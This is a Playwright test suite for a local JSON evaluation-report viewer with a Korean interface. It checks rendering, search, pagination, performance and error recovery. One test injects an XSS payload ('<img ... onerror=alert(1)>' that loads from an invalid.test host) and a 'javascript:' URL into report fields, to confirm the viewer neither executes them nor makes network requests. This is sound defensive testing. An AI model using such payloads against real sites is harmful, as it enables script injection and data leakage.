import { expect, test, type Locator, type Page } from '@playwright/test';
import { readFileSync } from 'node:fs';
import { fixturePath, dataModeLabel } from '../tests/data-source';
import type { Report } from '../src/report/types';
import { observeImportNetwork } from './network-observer';

const load = (name = 'scenario/normal.json'): Report => JSON.parse(readFileSync(fixturePath(name), 'utf8')) as Report;
const field = (scope: Locator, label: string) => scope.locator('.field').filter({ has: scope.page().locator('dt', { hasText: label }) }).locator('dd');
async function open(page: Page, report: Report) {
  await page.getByLabel('로컬 JSON 파일 선택').setInputFiles({
    name: 'local-report.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(report))
  });
  await expect(page.getByRole('status')).toContainText('계약 검증 성공');
  await expect(page.getByRole('region', { name: 'Overview · 평가 개요' })).toBeVisible();
}
async function expand(page: Page, index = 0) {
  const card = page.getByRole('article', { name: `검사 ${index + 1}`, exact: true });
  await card.locator('summary').filter({ hasText: '검사 상세·로그 펼치기' }).click();
  return card;
}

for (const name of ['normal', 'test-failure', 'forbidden-change', 'restored']) {
  test(`render every evaluation field for ${dataModeLabel}: ${name}`, async ({ page }) => {
    const r = load(`scenario/${name}.json`); await page.goto('./'); await open(page, r);
    const overview = page.getByRole('region', { name: 'Overview · 평가 개요' });
    await expect(field(overview, '프로젝트명')).toHaveText(r.project.name);
    await expect(field(overview, '도구')).toContainText(r.tool.version);
    await expect(field(overview, '전체 평가 상태')).toContainText(`(${r.status})`);
    await expect(field(overview, '실제 종료 코드')).toHaveText(String(r.exitCode));
    await expect(field(overview, '점수').first()).toHaveText(`${r.score}점`);
    await expect(field(overview, '검사 통과 / 전체')).toHaveText(`${r.summary.pass} / ${r.summary.total}`);
    await expect(field(overview, 'run ID')).toHaveText(r.run.id);
    await expect(field(overview, '시작 시각')).toHaveText(r.run.startedAt);
    await expect(field(overview, '종료 시각')).toHaveText(r.run.endedAt);
    await expect(field(overview, '실행 시간')).toHaveText(`${r.run.durationMs} ms`);
    await expect(field(overview, '실패 / 오류 / 건너뜀')).toHaveText(`${r.summary.fail} / ${r.summary.error} / ${r.summary.skipped}`);
    await expect(field(overview, '필수 / 선택')).toHaveText(`${r.summary.required} / ${r.summary.optional}`);
    await expect(field(overview, '선택 검사 실패')).toHaveText(String(r.summary.optionalFailures));
    for (let i = 0; i < r.checks.length; i++) {
      const c = r.checks[i]!; const card = await expand(page, i);
      await expect(card.getByRole('heading')).toContainText(c.label);
      await expect(field(card, 'id')).toHaveText(c.id);
      await expect(field(card, '종류')).toContainText(c.kind);
      await expect(field(card, '필수 여부')).toContainText(String(c.required));
      await expect(field(card, '검사 상태')).toContainText(`(${c.status})`);
      await expect(field(card, '실행 시간')).toHaveText(`${c.durationMs} ms`);
      await expect(field(card, '검사 종료 코드')).toHaveText(c.exitCode === null ? '종료 코드 없음 (null)' : String(c.exitCode));
      if (c.command !== undefined) await expect(field(card, '실행 파일')).toHaveText(c.command);
      if (c.args !== undefined) await expect(field(card, '인자')).toHaveText(JSON.stringify(c.args));
      if (c.reason) await expect(card).toContainText(c.reason);
      for (const stream of ['stdout', 'stderr'] as const) {
        if (c[stream]) {
          await card.locator('summary').filter({ hasText: `${stream} 펼치기` }).click();
          await expect(card.locator('pre').last()).not.toBeEmpty();
        }
      }
    }
    const git = page.getByRole('region', { name: 'Git Changes · 변경 기록' });
    await expect(field(git, '기준 ref')).toHaveText(r.git!.baseRef!);
    await expect(field(git, '기준 SHA')).toHaveText(r.git!.baseSha!);
    await expect(field(git, '수집 시각')).toHaveText(r.git!.capturedAt);
    await expect(git).toContainText('before-commands');
    await expect(git).toContainText('전체 줄 수가 아닙니다.');
    await expect(git).toContainText('알 수 없음 (null)');
    for (const c of r.git!.changes) await expect(git).toContainText(c.path);
    if (name === 'forbidden-change') {
      await expect(git.getByLabel('금지 파일 위반')).toContainText('경로: package.json · 일치 패턴: package.json');
    }
    await expect(page.getByRole('region', { name: '평가 진단', exact: true })).toContainText('점검한 교차 필드에서 불일치 없음');
  });
}

for (const name of ['official/success-no-git.json', 'official/execution-error.json', 'official/timeout.json',
  'official/type-error.json', 'synthetic/setup-error.json', 'synthetic/cancelled.json',
  'synthetic/optional-failure.json', 'synthetic/truncated-log.json']) {
  test(`special report rendering: ${name}`, async ({ page }) => {
    const r = load(name); await page.goto('./'); await open(page, r);
    const overview = page.getByRole('region', { name: 'Overview · 평가 개요' });
    await expect(field(overview, '전체 평가 상태')).toContainText(`(${r.status})`);
    await expect(field(overview, '실제 종료 코드')).toHaveText(String(r.exitCode));
    await expect(field(overview, '점수').first()).toHaveText(r.score === null ? '산정되지 않음 (null)' : `${r.score}점`);
    await expect(field(overview, '점수 완전성')).toContainText(`scoreComplete=${r.scoreComplete}`);
    const git = page.getByRole('region', { name: 'Git Changes · 변경 기록' });
    if (r.git === null) await expect(git).toContainText('Git 분석 결과 없음');
    else if (!r.git.enabled) await expect(git).toContainText('Git 검사 비활성');
    for (let i = 0; i < r.checks.length; i++) {
      const c = r.checks[i]!; const card = await expand(page, i);
      await expect(field(card, '검사 상태')).toContainText(`(${c.status})`);
      if (c.timedOut) await expect(field(card, '시간 제한 초과')).toContainText('예 (true)');
      if (c.outputTruncated) await expect(field(card, 'CLI 출력 잘림')).toContainText('CLI가 출력을 잘랐음');
      if (c.reason) await expect(card).toContainText(c.reason);
      if (c.exitCode === 2) await expect(field(card, '검사 종료 코드')).toHaveText('2');
    }
    await expect(page.getByRole('region', { name: '평가 진단', exact: true })).toContainText('점검한 교차 필드에서 불일치 없음');
  });
}

test('keyboard literal search, pagination, controls, close and replacement clear view state', async ({ page }) => {
  const r = load(); r.checks[0]!.stdout = 'x'.repeat(32765) + '.*[한글]' + 'y'.repeat(40000) + '.*[한글]\u202e';
  r.checks[0]!.outputTruncated = true;
  await page.goto('./'); await open(page, r);
  const card = page.getByRole('article', { name: '검사 1', exact: true });
  const details = card.locator('summary').filter({ hasText: '검사 상세·로그 펼치기' });
  await details.focus(); await page.keyboard.press('Enter');
  const log = card.locator('summary').filter({ hasText: 'stdout 펼치기' });
  await log.focus(); await page.keyboard.press('Space');
  const query = card.getByLabel('로그 검색 (일반 문자열·대소문자 구분)');
  await query.focus(); await page.keyboard.type('.*['); await query.fill('.*[한글]');
  await expect(card.locator('.search-state')).toContainText('2개 일치');
  await expect(card.locator('mark')).toHaveText('.*['); // Match spans display page boundary.
  const next = card.getByRole('button', { name: '다음 일치' });
  await next.focus(); await page.keyboard.press('Enter');
  await expect(card.locator('mark')).toHaveText('.*[한글]');
  await expect(card.locator('pre')).toContainText('\\u202e');
  await expect(card.locator('.search-state')).toContainText('현재 2번째 일치');
  await expect(card).toContainText('CLI가 출력을 잘랐음');
  await expect(card).toContainText('Viewer 표시 구간');
  await card.getByRole('button', { name: '이전 일치' }).click();
  await expect(card.locator('.search-state')).toContainText('현재 1번째 일치');
  await open(page, load('scenario/restored.json'));
  await expect(page.locator('textarea')).toHaveCount(0);
  await expect(page.locator('pre')).toHaveCount(0);
  await page.getByRole('button', { name: '닫기', exact: true }).click();
  await expect(page.locator('.dashboard')).toHaveCount(0);
  await expect(page.getByLabel('로컬 JSON 파일 선택')).toBeFocused();
});

test('consistent warnings remain separate and duplicated check IDs do not hide cards', async ({ page }) => {
  const r = load(); r.checks[1]!.id = r.checks[0]!.id;
  r.score = 42; r.summary.pass = 71; r.exitCode = 130;
  r.errors = [{ code: 'DECLARED_ERROR', message: 'original diagnostic', hint: 'original hint' }];
  await page.goto('./'); await open(page, r);
  await expect(page.locator('.check-card')).toHaveCount(3);
  const diagnostics = page.getByRole('region', { name: '평가 진단', exact: true });
  await expect(diagnostics.getByLabel('CLI errors', { exact: true })).toContainText('DECLARED_ERROR');
  const warnings = diagnostics.getByLabel('Viewer 일관성 경고', { exact: true });
  await expect(warnings).toContainText('summary.pass'); await expect(warnings).toContainText('중복 id');
  await expect(warnings).toContainText('status와 exitCode');
  await expect(page.locator('#overview')).toContainText('42점');
  await expect(page.locator('#overview')).toContainText('71 / 3');
});

test('untrusted detailed fields and search never create HTML, external links, requests or storage', async ({ page, browserName }) => {
  const sentinel = 'PHASE3_PRIVATE_SENTINEL';
  const attack = `<img src=https://invalid.test/${sentinel} onerror=alert(1)>`;
  const r = load(); r.project.name = attack; r.checks[0]!.label = attack;
  r.checks[0]!.command = 'javascript:alert(1)'; r.checks[0]!.args = [attack];
  r.checks[0]!.reason = attack; r.checks[0]!.stdout = `${attack}\n${sentinel}\u001b[31m`;
  r.git!.changes[0]!.path = attack;
  r.warnings = [{ code: attack, message: attack, hint: 'https://invalid.test/'+sentinel }];
  const requests: string[] = []; const consoleMessages: string[] = []; const dialogs: string[] = []; const sockets: string[] = [];
  const verifyNetwork = observeImportNetwork(page);
  page.on('request', request => requests.push(request.url() + (request.postData() ?? '')));
  page.on('console', message => consoleMessages.push(message.text()));
  page.on('pageerror', error => consoleMessages.push(error.message));
  page.on('dialog', dialog => { dialogs.push(dialog.message()); void dialog.dismiss(); });
  page.on('websocket', socket => sockets.push(socket.url()));
  await page.goto('./'); await open(page, r); const card = await expand(page);
  await card.locator('summary').filter({ hasText: 'stdout 펼치기' }).click();
  await card.getByLabel('로그 검색 (일반 문자열·대소문자 구분)').fill(sentinel);
  await expect(card.locator('.search-state')).toContainText('2개 일치');
  await expect(card.locator('pre')).toContainText(attack);
  await expect(card.locator('pre')).toContainText('\\u001b');
  await expect(page.locator('img, iframe')).toHaveCount(0);
  expect(await page.locator('.dashboard a').evaluateAll(links => links.every(a => a.getAttribute('href')?.startsWith('#')))).toBe(true);
  await verifyNetwork(browserName, Buffer.from(JSON.stringify(r)), sentinel);
  expect(requests.join()).not.toContain(sentinel);
  expect.soft(consoleMessages).toEqual([]); expect(dialogs).toEqual([]); expect(sockets).toEqual([]);
  expect(await page.evaluate(async () => ({ local: localStorage.length, session: sessionStorage.length,
    db: await indexedDB.databases(), caches: await caches.keys() }))).toEqual({ local: 0, session: 0, db: [], caches: [] });
  await page.getByRole('button', { name: '닫기', exact: true }).click();
  await expect(page.locator('body')).not.toContainText(sentinel);
  await page.reload(); await expect(page.locator('.dashboard')).toHaveCount(0);
});

test('large lists and multi-megabyte single-line logs remain paged and responsive at 320px', async ({ page }, testInfo) => {
  const r = load(); const c = r.checks[0]!; const change = r.git!.changes[0]!;
  r.checks = Array.from({ length: 1000 }, (_, i) => ({ ...c, id: `check-${i}`, label: `CHECK_${i}`, stdout: '', stderr: '' }));
  r.checks[0]!.stdout = 'x'.repeat(2 * 1024 * 1024) + 'SEARCH_END';
  r.git!.changes = Array.from({ length: 5000 }, (_, i) => ({ ...change, path: `새로운 경로/${i}/` + 'x'.repeat(100) }));
  r.summary = { pass: 1000, fail: 0, error: 0, skipped: 0, required: 1000, optional: 0, total: 1000, optionalFailures: 0 };
  r.git!.stats.files = 5000;
  await page.setViewportSize({ width: 320, height: 720 }); await page.goto('./');
  const start = Date.now(); await open(page, r); const importMs = Date.now() - start;
  await expect(page.locator('.check-card')).toHaveCount(100);
  await expect(page.getByLabel('Git 변경 파일').locator(':scope > li')).toHaveCount(100);
  await page.getByRole('navigation', { name: '검사 목록 페이지' }).getByRole('button', { name: '다음 페이지' }).click();
  await expect(page.locator('.check-card').first()).toContainText('CHECK_100');
  await page.getByRole('navigation', { name: '검사 목록 페이지' }).getByRole('button', { name: '이전 페이지' }).click();
  const card = await expand(page);
  await card.locator('summary').filter({ hasText: 'stdout 펼치기' }).click();
  expect((await card.locator('pre').textContent())!.length).toBe(32768);
  const query = card.getByLabel('로그 검색 (일반 문자열·대소문자 구분)');
  const searchStart = Date.now(); await query.fill('SEARCH_END');
  await expect(card.locator('mark')).toHaveText('SEARCH_END'); const searchMs = Date.now() - searchStart;
  await query.fill('x'); await expect(card.locator('.search-state')).toContainText('1000개 일치 · 검색 한도 도달');
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
  await page.getByRole('navigation', { name: 'Git 변경 목록 페이지' }).getByRole('button', { name: '다음 페이지' }).click();
  await expect(page.getByLabel('Git 변경 파일').locator(':scope > li').first()).toContainText('새로운 경로/100/');
  await query.fill('NOT_PRESENT'); // Closing also cancels an in-flight/debounced search.
  await page.getByRole('button', { name: '닫기', exact: true }).click();
  await expect(page.locator('.dashboard')).toHaveCount(0);
  await expect(page.getByLabel('로컬 JSON 파일 선택')).toBeFocused();
  await testInfo.attach('performance', { body: JSON.stringify({ importMs, searchMs, checks: 1000, gitChanges: 5000,
    logChars: r.checks[0]!.stdout!.length, jsonBytes: Buffer.byteLength(JSON.stringify(r)), viewport: 320 }), contentType: 'application/json' });
});

test('render failure has a static recovery message, no exception leak and resets on replacement', async ({ page }) => {
  const messages: string[] = [];
  page.on('console', message => messages.push(message.text()));
  page.on('pageerror', error => messages.push(error.message));
  await page.addInitScript(() => {
    const original = String.prototype.replace;
    Object.defineProperty(String.prototype, 'replace', { configurable: true, writable: true, value: function (this: string, ...args: unknown[]) {
      if (String(this) === 'BOUNDARY_THROW_SENTINEL') throw new Error('PRIVATE_RENDER_EXCEPTION');
      return Reflect.apply(original, this, args) as string;
    } });
  });
  const r = load(); r.checks[0]!.label = 'BOUNDARY_THROW_SENTINEL';
  await page.goto('./');
  await page.getByLabel('로컬 JSON 파일 선택').setInputFiles({
    name: 'render-error.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(r))
  });
  await expect(page.getByRole('alert')).toHaveText('평가 화면을 표시할 수 없습니다. 닫거나 다른 파일을 선택하세요.');
  await expect(page.locator('body')).not.toContainText('PRIVATE_RENDER_EXCEPTION');
  expect(messages).toEqual([]);
  await open(page, load()); await expect(page.getByRole('alert')).toHaveCount(0);
  await page.getByRole('button', { name: '닫기', exact: true }).click();
  await expect(page.getByLabel('로컬 JSON 파일 선택')).toBeFocused();
});
